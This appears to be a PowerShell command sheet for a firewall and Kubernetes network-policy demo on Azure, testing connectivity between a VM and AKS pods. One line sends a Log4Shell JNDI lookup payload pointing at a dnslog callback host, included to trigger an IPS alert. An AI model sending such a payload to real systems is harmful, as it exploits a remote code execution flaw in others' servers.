## Demo flow in PowerShell

*Hint: define Shift-Enter as "Run selected text in active terminal" in VScode*

```powershell
# access TF
Set-Alias tf C:\Users\mkoldov\AppData\Local\Microsoft\WinGet\Links\terraform.exe
Set-Alias terraform C:\Users\mkoldov\AppData\Local\Microsoft\WinGet\Links\terraform.exe
# shortcut for kubectl
Set-Alias k kubectl

# easy SSH access to chkp and u1
code $env:USERPROFILE/.ssh/config
# Host cp
#    Hostname 68.219.229.203
#    IdentityFile /users/mkoldov/.ssh/azureshell.key
#    User admin
#    LogLevel ERROR
 
# Host u1
#    HostName 10.42.5.4
#    User azureuser
#    ProxyJump cp
#    IdentityFile ~/.ssh/u1tf.key

# Management readyness
ssh cp 
# watch -n 10 -d api status

# make connection from U1
ssh u1 curl ip.iol.cz/ip/ -s
# 5 times
1..5 | % { ssh u1 curl ip.iol.cz/ip/ -s }
1..5 | % { ssh u1 curl ipconfig.me -Ls }
1..5 | % { ssh u1 curl ifconfig.me -Ls }
# IPS incident 
ssh u1 curl ip.iol.cz/ip/ -m1 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
# while true; do curl ip.iol.cz/ip/ -m1 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'; sleep 5; done

# check VM tags
az vm show --resource-group rg-ademo --name ubuntu1 --query tags
# put u1 to prod
az vm update --resource-group rg-ademo --name ubuntu1 --set tags.env=prod tags.app=ubuntu
# put u1 to test
az vm update --resource-group rg-ademo --name ubuntu1 --set tags.env=test tags.app=ubuntu

# logs in console
ssh cp 'fw log -l -p -n -f | grep " Ubuntu test to Internet"'

# check cluster readyness
terraform output -raw kube_config > $env:TEMP/k.config
$env:KUBECONFIG="$env:TEMP/k.config"
# OR
az aks list -g rg-ademo  -o table
az aks get-credentials -n aks1 -g rg-ademo
kubectl config use-context aks1

kubectl get nodes -o wide
kubectl get pods -n demo -o wide --show-labels
kubectl get pods -n default -o wide --show-labels


# make connection from pods in ns demo:
kubectl get pods -n demo -o name -l app=webka1 | % { Write-Host $_; kubectl -n demo exec -it $_ -- curl -s -m1 ip.iol.cz/ip/; Write-Host  }
# to Linux
kubectl get pods -n demo -o name -l app=webka1 | % { Write-Host $_; kubectl -n demo exec -it $_ -- curl -s -m1 10.42.5.4; Write-Host  }

# try conn from Pods in DEFAULT
kubectl get pods -n default -o name | % { Write-Host $_; kubectl -n default exec -it $_ -- curl -s -m1 ip.iol.cz/ip/; Write-Host  }

# scale app up
kubectl -n demo scale deploy webka1 --replicas 9
kubectl get pods -n demo -o wide --show-labels
# scale app down
kubectl -n demo scale deploy webka1 --replicas 3
kubectl get pods -n demo -o wide --show-labels

# put all to prod
kubectl get pods -n demo -o name -l app=webka1 | % { kubectl -n demo label $_ env=prod --overwrite  }
kubectl get pods -n demo -o wide --show-labels
# put all to test
kubectl get pods -n demo -o name -l app=webka1 | % { kubectl -n demo label $_ env=test --overwrite  }
kubectl get pods -n demo -o wide --show-labels

# put first to prod
kubectl get pods -n demo -o name -l app=webka1 | select -first 1 | % { kubectl -n demo label $_ env=prod --overwrite  }
kubectl get pods -n demo -o wide --show-labels

# put last 3 to test
kubectl get pods -n demo -o name -l app=webka1 | select -last 3 | % { kubectl -n demo label $_ env=test --overwrite  }
kubectl get pods -n demo -o wide --show-labels

# try (dropped) connection from default ns
kubectl get pods -o name | % { Write-Host $_; kubectl exec -it $_ -- curl ifconfig.me -L -m1  }
# vs from demo ns
kubectl get pods -o name -n demo | % { Write-Host $_;  kubectl -n demo exec -it $_ -- curl ifconfig.me -L -m1  }

# from Ubuntu to webka1 pods in ns demo
#kubectl get pods -o jsonpath="{.items[*].status.podIP}" -n demo -l app=webka1 | % { Write-Host $_; "ssh u1 curl -s -m1 $_" }
kubectl get pods -n demo -o custom-columns=ip:.status.podIP | select -skip 1 | % { Write-Host $_; ssh u1 curl -s -v -m1 $_ }
# from Pods to U1
kubectl get pods -n demo -o name -l app=webka1 | % { Write-Host $_; kubectl -n demo exec -it $_ -- curl -v -m1 10.42.5.4; Write-Host  }
# from gw to U1
ssh cp curl_cli 10.42.5.4
# from gw to Pod
ssh cp curl_cli 10.42.1.28
```